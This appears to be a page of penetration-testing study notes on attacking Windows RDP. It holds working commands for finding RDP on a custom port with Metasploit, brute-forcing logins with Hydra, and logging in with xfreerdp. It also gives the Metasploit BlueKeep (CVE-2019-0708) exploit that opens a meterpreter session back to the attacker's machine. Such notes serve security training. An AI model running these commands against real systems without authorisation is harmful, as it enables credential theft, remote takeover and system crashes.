---
description: '3389'
---

# 3 - Exploiting RDP

## **Exploiting RDP**

* The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
* RDP uses TCP port 3389 by default, and can be configured to run on any other TCP port.
* RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.
* We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.



## **Practical Demonstration**

RDP can be configured on another port instead of the default port 3389, in this case port 3333.

```bash
# we can use a metasploit module to check if a port is RDP port
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
options
set RHOSTS $ip
set RPORT 3333 # set this to the value you are doubtful of.
run
# we detected that RDP is running on that port.
```

In order to authenticate/login via RDP, we need valid credentials, so we can use bruteforce to obtain these credentials.

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt rdp://$ip -s 3333` - specify the port with the `-s` .&#x20;

### Using \[xfreerdp] utility to login via rdp

`xfreerdp /u:administrator /p:quertyuiop /v:$ip:3333` - Connect to target machine via RDP with correct credentials.



## Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)

### **CVE-2019-0708 - BlueKeep**

* BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attacker to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target is a part of.
* The BlueKeep vulnerability was made public by Microsoft in May 2019.
* The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.
* Microsoft released a patch for this vulnerability on May 14th 2019 and has urged companies to patch this vulnerability as soon as possible.
* At the time of discovery, about 1 million systems worldwide were found to be vulnerable.
* The BlueKeep vulnerability affects multiple versions of Windows:
  * XP
  * Vista
  * Windows 7
  * Windows Server 2008 & R2

### **CVE-2019-0708 - BlueKeep Exploit**

* The BlueKeep vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature. It is therefore recommended to only utilize verified exploit code and modules for exploitation.
* The BlueKeep exploit has an MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
* The BlueKeep exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.

### **Practical Demonstration**

{% code overflow="wrap" %}
```bash
# 1
# Check if the target system is vulnerable to the BlueKeep vulnerability.
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $ip
run

# 2
# Exploit for the BlueKeep vulnerability (You have to set the target OS version..
# .. yourself) (show targets)
# this exploit works on only 64bit windows system.
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
options
set RHOSTS $ip
set LHOST $kali_ip
show targets # select your target system.
# If the CHUNK GROOM (kernel memory) size is too high, the target system will crash.
run
# we might get a metepreter session.
```
{% endcode %}



